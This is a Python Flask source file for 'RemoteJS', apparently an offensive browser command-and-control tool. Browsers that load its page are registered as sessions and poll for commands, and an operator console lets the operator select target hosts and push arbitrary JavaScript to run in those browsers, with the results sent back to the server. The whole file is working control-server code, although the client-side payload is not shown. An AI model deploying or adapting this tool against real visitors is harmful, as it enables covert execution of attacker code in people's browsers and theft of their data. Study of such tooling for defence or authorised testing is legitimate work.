# MIT License
#
# Copyright (c) 2020 fputs
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from flask import Flask, request
from session import Session
import threading
import time
import os
import signal

# Allows commandline history
try:
    import readline
except ImportError:
    pass

# Remove Flask's logging
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class SessionServer():
    """
    Manages current client sessions, and provides methods for
    interacting with them via the command line.
    """

    web_sessions = []      # All active web sessions
    web_timeout =  3       # The number of seconds we wait, before the session is classed as inactive
    running = True         # Allows us to stop threads when the user exits
    blocking_on = None     # Used to block and wait for a client to provide a response
    
    def __init__(self):
        session_timeout_thread = threading.Thread(target=self.decrement_timeouts)
        user_input_thread = threading.Thread(target=self.next_command)
        session_timeout_thread.start()
        user_input_thread.start()

    # ================================= Server Handling ========================================

    def stop(self):
        """
        Exit the interpreter.
        """
        print("Quitting...")
        self.running = False
        os.kill(os.getpid(), signal.SIGTERM) # Hacky way of killing Flask

    # ================================= Session Handling =======================================

    def register_new_session(self, host):
        """
        Creates a new session, if one for the host does not currently exist.
        """
        session = None
        for sess in self.web_sessions:
            if sess.host == host:
                session = sess
                break

        if session == None:
            session = Session.load_session(host)
            self.web_sessions.append(session)
            session.timeout_timer = self.web_timeout

        return session

    def decrement_timeouts(self):
        """
        Decrement the timers for all sessions.

        If a session's timer has reached zero, it is removed from the
        list of active sessions.
        """
        while self.running:
            for sess_index in reversed(range(0, len(self.web_sessions))):
                self.web_sessions[sess_index].timeout_timer -= 1
                if self.web_sessions[sess_index].timeout_timer == 0:
                    if self.blocking_on == self.web_sessions[sess_index].host:
                        self.blocking_on = None
                    del self.web_sessions[sess_index]
            time.sleep(1)

    def reset_timeout(self, host):
        """
        Resets a session's timer.
        """
        for sess in self.web_sessions:
            if sess.host == host:
                sess.timeout_timer = self.web_timeout
                break

    def get_next_command(self, host):
        """
        Gets the next command for a specific hostname.
        """
        for sess in self.web_sessions:
            if sess.host == host:
                return sess.get_next_command()
        return "void(0)"

    # =================================== Console Handling =======================================

    def push_command(self, host, command):
        """
        Adds a new command to a session's command queue.
        """
        for sess in self.web_sessions:
            if sess.host == host:
                sess.add_command(command) 
                break

    def next_command(self):
        """
        Reads the next command from the command line interface.
        """
        time.sleep(2)
        print("\033[32m * Ready!\033[0m\n")

        vars = {"RHOST": None}

        while self.running:
            while self.blocking_on != None:
                time.sleep(0.5)

            line = input("(\033[32m%s\033[0m)>" % (vars["RHOST"])) 

            if line[:4] in ("exit", "quit"):
                    self.stop()

            parts = line.split()
            if len(parts) == 0: 
                continue

            if parts[0] == "help":
                print("\nCommand       | Description                          | Syntax")
                print("-" * 80)
                print("set           | Sets an environment variable.        | set <varname> <value>")
                print("show          | Shows an environment variable.       | show (varname|all)")
                print("show sessions | Shows all active sessions.           | show sessions")
                print("exit          | Shuts down the server.               | exit|quit")
                print("exec          | Run a script in the client's browser | exec <script>")
                print()

            elif parts[0] == "set":
                if len(parts) > 1:
                    vars[parts[1]] = ' '.join(parts[2:])
                    print("Assigned %s -> %s" % (parts[1], ' '.join(parts[2:])))

            elif parts[0] == "show":
                if len(parts) > 1:
                    if parts[1] == "sessions":
                        if len(self.web_sessions) == 0:
                            print("\033[31mNo active sessions\033[0m")
                        else:
                            print("\nHostname             | TTL (sec)                 ")
                            print("-" * 80)
                            for sess in self.web_sessions:
                                print("%-20s | %-60d" % (sess.host, sess.timeout_timer))
                            print()

                    elif parts[1] == "all":
                        print("\nVariable             | Value")
                        print("-" * 80)
                        for var in vars:
                            print("%-20s | %-20s" % (var, vars[var]))
                        print()

                    elif parts[1] in vars:
                        print("%s -> %s" % (parts[1], vars[parts[1]]))
                    else:
                        print("\033[31mUnrecognised variable\033[0m")

            elif parts[0] == "exec":
                if vars["RHOST"] == None:
                    print("\033[31mNo RHOST selected\033[0m")
                elif len(parts) > 1:
                    for RHOST in vars["RHOST"].split():
                        self.push_command(RHOST, line[5:])
                        self.blocking_on = RHOST
                else:
                    print("\033[31mNo script provided\033[0m")
                
            else:
                print("\033[31mUnknown command\033[0m")

web_server = Flask(__name__)
session_server = SessionServer()

@web_server.route("/")
def index():
    """
    The website's index page.
    """
    hostname = request.host.split(":")[0]
    session_server.register_new_session(hostname)
    with open("www/index.html", "r") as f:
        html = f.read()
        return html
    return "<h1>Error 500: Internal Server Error</h1>"

@web_server.route("/cmd")
def cmd():
    """
    The route that provides a client with its next command.
    """
    hostname = request.host.split(":")[0]
    session_server.register_new_session(hostname)
    session_server.reset_timeout(hostname)
    cmd_ = session_server.get_next_command(hostname)
    return cmd_

@web_server.route("/result", methods=["POST"])
def result():
    """
    The route that clients send their response to.
    """
    hostname = request.host.split(":")[0]
    session_server.register_new_session(hostname)
    session_server.reset_timeout(hostname)
    if "response" in request.form and request.form["response"] == "ALIVE":
        pass
    else:
        print("{}: Status={}".format(request.host, request.form["status"]), end=("" if "response" in request.form else "\n"))
        if "response" in request.form:
            print(", Response={}".format(request.form["response"]))
    
    if session_server.blocking_on == hostname:
        session_server.blocking_on = None

    return ""


def print_banner():
    """
    Prints the necessary ASCII art.
    """
    print("""
        ____                       __           _______
       / __ \___  ____ ___  ____  / /____      / / ___/
      / /_/ / _ \/ __ `__ \/ __ \/ __/ _ \__  / /\__ \ 
     / _, _/  __/ / / / / / /_/ / /_/  __/ /_/ /___/ / 
    /_/ |_|\___/_/ /_/ /_/\____/\__/\___/\____//____/  
                                            By fputs    
    """)
                                                   
print_banner()
web_server.run()
session_server.stop()
print("Cleaning up...")
